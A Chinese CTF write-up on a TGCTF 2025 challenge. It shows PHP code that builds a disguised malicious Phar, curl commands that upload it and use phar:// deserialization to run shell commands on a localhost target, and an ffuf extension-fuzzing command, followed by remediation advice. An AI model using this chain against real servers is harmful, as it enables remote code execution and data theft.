---
title: "TGCTF 2025：文件上传 + PHP 反序列化链"
slug: "ctf-tgctf-2025-php-chain"
date: 2026-09-02T16:58:56+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "上传伪装 + POP 链构造，通关 TGCTF 文件上传复仇题。"
summary: "上传伪装 + POP 链构造，通关 TGCTF 文件上传复仇题。"
tags: ["CTF", "TGCTF", "反序列化"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 14
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/14.TGCTF2025文件上传+PHP反序列化链.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-tgctf-2025-php-chain/workflow.svg" alt="先让上传文件成为反序列化入口，再沿对象链调用危险方法。" loading="lazy">
  <figcaption>图 1 · TGCTF 上传 + POP 链。先让上传文件成为反序列化入口，再沿对象链调用危险方法。</figcaption>
</figure>

## 1. 为什么第二关要用 Phar

第一关的 `unserialize` 入口被 `file_exists` 挡住，但 PHP 的文件系统函数在遇到
`phar://` 时会解析 Phar metadata，从而**不调用 `unserialize` 也能触发对象反序列化**。

前提：

- 有上传点，能上传 Phar 文件；
- 能控制 `filename` 或类似路径参数；
- 目标能触发 `file_exists`、`is_dir`、`include` 等文件系统函数；
- `phar.readonly=0` 时才能本地生成 Phar。

## 2. 对象链

```php
class yesterday {
    public $study;
}

class today {
    public $doing;
}

class future {
}
```

目标端预期链：

```text
yesterday::__destruct
  → today::__call
  → future::__toString
  → system($_POST['wow'])
```

本关的类定义必须与目标源码一致；上面的结构用于生成本地 Phar。

## 3. 生成恶意 Phar

```php
<?php
class yesterday {
    public $study;
}

class today {
    public $doing;
}

class future {
}

$yesterday = new yesterday();
$yesterday->study = new today();
$yesterday->study->doing = new future();

$path = __DIR__ . '/exploit.phar';
@unlink($path);

$phar = new Phar($path);
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($yesterday);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

rename($path, __DIR__ . '/exploit.atg');
echo "generated exploit.atg\n";
```

执行：

```bash
php -d phar.readonly=0 build_phar.php
```

## 4. 上传并触发

上传：

```bash
curl -i -sS -F 'file=@exploit.atg' \
  'http://127.0.0.1:<target-port>/upload.php'
```

确认上传路径，例如：

```text
uploads/exploit.atg
```

触发：

```bash
curl -sS -X POST \
  --data-urlencode 'wow=id' \
  --get --data-urlencode 'filename=phar://uploads/exploit.atg' \
  'http://127.0.0.1:<target-port>/class.php'
```

读取 flag：

```bash
curl -sS -X POST \
  --data-urlencode 'wow=cat /flag' \
  --get --data-urlencode 'filename=phar://uploads/exploit.atg' \
  'http://127.0.0.1:<target-port>/class.php'
```

## 5. 扩展名爆破

如果不知道允许什么后缀，用 Burp Intruder 或 ffuf：

```bash
ffuf -u 'http://127.0.0.1:<target-port>/upload.php' \
  -X POST \
  -F 'file=@exploit.phar;filename=exploit.FUZZ' \
  -w /path/to/SecLists/Discovery/Web-Content/web-extensions.txt \
  -mc all -fs 0
```

Phar 依赖文件头，不依赖 `.phar` 后缀，改成允许的后缀仍可能解析。

## 6. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 生成报错 `phar.readonly` | 未关闭只读 | `php -d phar.readonly=0` |
| upload 拒绝 `.atg` | 扩展名不在白名单 | 用 Burp 字典爆破 |
| `phar://` 无反应 | 路径不对或函数未触发 | 先 `file_exists('phar://...')` 验证 |
| 类名不一致 | 目标源码与本地不同 | 复制真实类定义 |

## 7. 修复

- 上传目录与业务代码隔离；
- 禁止 `phar://`；
- 校验上传文件真实类型；
- 禁用不必要的反序列化；
- 不把对象 metadata 当作可信数据。
